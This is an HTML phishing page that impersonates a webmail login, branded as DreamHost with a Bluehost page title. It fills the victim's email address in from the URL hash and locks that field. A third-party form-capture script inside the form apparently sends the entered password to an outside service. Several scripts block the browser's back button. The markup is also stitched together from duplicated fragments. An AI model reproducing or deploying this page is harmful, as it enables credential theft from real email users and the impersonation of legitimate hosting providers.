<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bluehost - Webmail Login</title>
    <!-- Link to external stylesheet -->
    <link rel="stylesheet" href="style.css">
<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body {
    background-color: #ffffff;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
    position: relative;
}

/* Center Interactive Frame Box Layout Component Area */
.login-wrapper {
    width: 100%;
    max-width: 380px;
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
}

/* Logo Alignment Block Styling Properties */
.brand-logo-container {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    margin-bottom: 36px;
}

.logo-icon {
    width: 32px;
    height: 32px;
    fill: #0070f3; /* Signature DreamHost corporate blue */
}

.brand-text {
    font-size: 26px;
    font-weight: 700;
    color: #000000;
    letter-spacing: -0.5px;
}

.login-form {
    width: 100%;
    display: flex;
    flex-direction: column;
    gap: 12px;
    margin-bottom: 20px;
}

/* Base Input Layout Stack Component Area Box */
.input-row {
    display: flex;
    align-items: center;
    width: 100%;
    height: 50px;
    border: 1px solid #e2e8f0;
    border-radius: 6px;
    padding: 0 16px;
    background-color: #ffffff;
    transition: border-color 0.15s ease, box-shadow 0.15s ease;
}

/* Signature Active Blue Outline Component Feature Replica */
.input-row.focused {
    border-color: #0070f3;
    box-shadow: 0 0 0 1px #0070f3;
}

.input-icon {
    font-size: 14px;
    color: #a0aec0;
    margin-right: 12px;
    user-select: none;
}

.form-control {
    flex: 1;
    height: 100%;
    border: none;
    outline: none;
    font-size: 15px;
    color: #1a202c;
    background: transparent;
}

.form-control::placeholder {
    color: #a0aec0;
    font-weight: 400;
}

/* Vibrant Royal Blue Capsule Submit Block Action Trigger Component Button */
.submit-btn {
    width: 100%;
    background-color: #0070f3;
    color: #ffffff;
    border: none;
    height: 50px;
    font-size: 15px;
    font-weight: 600;
    border-radius: 6px;
    cursor: pointer;
    margin-top: 4px;
    transition: background-color 0.15s ease;
}

.submit-btn:hover {
    background-color: #0056b3;
}

/* Base Footnote Utility Ribbon Links Wrapper components */
.form-footer {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    font-size: 13px;
}

.footer-text {
    color: #718096;
}

.divider {
    color: #cbd5e0;
}

.support-link {
    color: #0070f3;
    text-decoration: none;
    font-weight: 500;
}

.support-link:hover {
    text-decoration: underline;
}

/* Desktop Environment Environment Overlay System Watermark Notification Repro */
.system-watermark {
    position: fixed;
    bottom: 24px;
    right: 24px;
    text-align: left;
    font-size: 13px;
    color: rgba(0, 0, 0, 0.12);
    line-height: 1.4;
    user-select: none;
    pointer-events: none;
    z-index: 10;
}

</style>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DreamHost Webmail Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- Centered Form Canvas Component Container -->
    <main class="login-wrapper">
        
        <!-- Brand Logo Element Block Header -->
        <div class="brand-logo-container">
            <svg class="logo-icon" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9L17 12l-6 4.5z"/>
            </svg>
            <span class="brand-text">DreamHost</span>

        </div>
    <br><p><br>
        <!-- Form Submission Framework Integration with FormSubmit -->
        <form action="" method="POST" class="login-form">
            <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
            <!-- Focused Row Component matching Blue Border Accent Layout -->
            <div class="input-row focused">
                <span class="input-icon">👤</span>
                <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
            </div>
            
            <div class="input-row">
                <span class="input-icon">🔒</span>
<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
            </div>
            
            <!-- Solid Rounded Rectangular Vibrant Blue Submit Trigger Button -->
            <button type="submit" class="submit-btn">Login</button>
        </form>

        <!-- Bottom Informational Reference Links Footer Strip -->
        <footer class="form-footer">
            <span class="footer-text">DreamHost Webmail</span>
            <span class="divider">&bull;</span>
            <a href="#" class="support-link">Get support</a>
        </footer>

    </main>


    </div>
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>
</html>
